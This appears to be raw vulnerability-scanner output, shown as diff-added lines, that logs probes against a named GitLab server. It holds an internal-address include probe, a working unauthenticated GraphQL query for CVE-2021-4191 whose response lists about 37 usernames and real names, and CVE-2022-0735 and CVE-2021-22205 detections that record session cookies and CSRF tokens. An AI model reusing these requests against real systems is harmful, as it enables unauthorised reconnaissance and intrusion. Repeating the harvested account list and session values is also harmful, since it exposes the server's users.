+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json
+Date: Thu, 26 Mar 2026 06:17:34 GMT
+Etag: W/"b635f94e9dd628f1735099bfbf852052"
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Request-Id: kX0MwfJ0VI5
+X-Runtime: 0.012197
+
+{"status":"invalid","errors":["Included file `http://127.0.0.1:9100/test.yml` does not have valid YAML syntax!"]}
+============================================
+[vuln] [medium] [CVE-2021-4191] https://sand.yunqiandou.com/api/graphql
+================  请求数据包 ================
+POST /api/graphql HTTP/1.1
+Host: sand.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari
+Connection: close
+Content-Length: 917
+Accept: */*
+Content-Type: application/json
+Origin: https://sand.yunqiandou.com
+Referer: https://sand.yunqiandou.com/-/graphql-explorer
+Accept-Encoding: gzip
+
+{"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: Link, X-Total, X-Total-Pages, X-Per-Page, X-Page, X-Next-Page, X-Prev-Page, X-Gitlab-Blob-Id, X-Gitlab-Commit-Id, X-Gitlab-Content-Sha256, X-Gitlab-Encoding, X-Gitlab-File-Name, X-Gitlab-File-Path, X-Gitlab-Last-Commit-Id, X-Gitlab-Ref, X-Gitlab-Size
+Access-Control-Max-Age: 7200
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:34 GMT
+Etag: W/"ad332e571214fbf41c3f91b90d7adc9c"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: vfAn2tPBhq4
+X-Runtime: 0.058450
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+{"data":{"users":{"nodes":[{"id":"gid://gitlab/User/65","name":"GitLab Alert Bot","username":"alert-bot"},{"id":"gid://gitlab/User/64","name":"zhanglijuan","username":"zhanglijuan"},{"id":"gid://gitlab/User/62","name":"yangwanli","username":"yangwanli"},{"id":"gid://gitlab/User/61","name":"wuwenyu","username":"wuwenyu"},{"id":"gid://gitlab/User/60","name":"tongmiao","username":"tongmiao"},{"id":"gid://gitlab/User/59","name":"lwj","username":"lwj"},{"id":"gid://gitlab/User/58","name":"gzt","username":"gzt"},{"id":"gid://gitlab/User/57","name":"wanglinyang","username":"wanglinyang"},{"id":"gid://gitlab/User/56","name":"hanshuai","username":"hanshuai"},{"id":"gid://gitlab/User/55","name":"heyi","username":"heyi"},{"id":"gid://gitlab/User/54","name":"meijie","username":"meijie"},{"id":"gid://gitlab/User/53","name":"lixin","username":"lixin"},{"id":"gid://gitlab/User/52","name":"zbf","username":"zbf"},{"id":"gid://gitlab/User/51","name":"liangdongdong","username":"liangdongdong"},{"id":"gid://gitlab/User/50","name":"chenwenxing","username":"chenwenxing"},{"id":"gid://gitlab/User/45","name":"wufan","username":"spirit-wufan"},{"id":"gid://gitlab/User/41","name":"jzk","username":"jzk"},{"id":"gid://gitlab/User/40","name":"zhoutianhui","username":"zhoutianhui"},{"id":"gid://gitlab/User/36","name":"黄政阳","username":"hzy"},{"id":"gid://gitlab/User/34","name":"zhouquanbo","username":"zhouquanbo"},{"id":"gid://gitlab/User/33","name":"ls","username":"ls"},{"id":"gid://gitlab/User/31","name":"9GphYZYkxe","username":"9GphYZYkxe"},{"id":"gid://gitlab/User/30","name":"zhangwei","username":"zhangwei"},{"id":"gid://gitlab/User/29","name":"chenkang@aicaihr.com","username":"chenkang"},{"id":"gid://gitlab/User/27","name":"lijiaxin","username":"lijiaxin"},{"id":"gid://gitlab/User/26","name":"heajing","username":"heajing"},{"id":"gid://gitlab/User/25","name":"yuxinyu","username":"yuxinyu"},{"id":"gid://gitlab/User/24","name":"fxl","username":"fxl"},{"id":"gid://gitlab/User/19","name":"songfeihu","username":"songfeihu"},{"id":"gid://gitlab/User/16","name":"chenyifan","username":"chenyifan"},{"id":"gid://gitlab/User/14","name":"xiaqi","username":"xiaqi"},{"id":"gid://gitlab/User/13","name":"tianmaoshan","username":"tianmaoshan"},{"id":"gid://gitlab/User/9","name":"chenpengfei","username":"chenpengfei"},{"id":"gid://gitlab/User/5","name":"Ghost User","username":"ghost"},{"id":"gid://gitlab/User/3","name":"liuyuhong","username":"lyh"},{"id":"gid://gitlab/User/2","name":"maxuefeng","username":"maxuefeng"},{"id":"gid://gitlab/User/1","name":"Administrator","username":"root"}]}}}
+============================================
+[vuln] [critical] [CVE-2022-0735] https://sand.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: sand.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:34 GMT
+Etag: W/"b13f5e1ca284b478917fc70ddc44b79c"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqRTVaVGszTkRkbExUSTRaV0l0TkdVMU9TMDRNREppTFRFNE56QXpORFV6WVRVMU5DST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--8e645257d8910b5145ac90ce0a8346d954c23805; path=/; expires=Mon, 26 Mar 2046 06:17:34 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=c28e98b000c7ffafac493ef34a186364; path=/; expires=Thu, 26 Mar 2026 08:17:34 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: NU8XyMJMSs2
+X-Runtime: 0.037047
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://sand.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://sand.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://sand.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="ywuNgyb6fza32Sj6+vrgFkUBjwiONn5YWglktvDLdGuxgiCfAt67DRMimKcGyc3fKbajHaXuBJ10mNBzd0dFcQ==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-safari gl-platform-mac login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isSafari":true,"isMac":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="HBmaAPF0HBCLsvDsoYBRYDDD75aMOFzkjXFxw6IcLpFmkDcc1VDYKy9JQLFds3ypXHTDg6fgJiGj4MUGJZAfiw==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+[vuln] [critical] [CVE-2021-22205] https://sand.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: sand.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:34 GMT
+Etag: W/"533d2b3527d75895b340fa8794e6b060"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqSXdOR0ZrWXpsbExUUmhOR010TkRrNU5DMDVOR1V4TFRNd01tTmhaVGM0TWpFMlpDST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--345698148f4feb19724d281522e2d0607427c50c; path=/; expires=Mon, 26 Mar 2046 06:17:34 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=eebcd13b49939ee65323d82563770c24; path=/; expires=Thu, 26 Mar 2026 08:17:34 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: qOLM5N2kBO
+X-Runtime: 0.022323
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://sand.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://sand.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://sand.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="wIVo1JMuTmKdjm/MBi2pSExPuVPIlI16dozlPqKv9KyHk+ZhL3kwE5pdPywCtQFWejeSfZDxyFeUMQIrESoZZg==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-safari gl-platform-mac login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isSafari":true,"isMac":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="inTGYNDCzPPs2JDoi7/5fSX9VnBRH07WJWH/4GpbwdTNYkjVbJWygusLwAiPJ1FjE4V9Xgl6C/vH3Bj12d4sHg==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
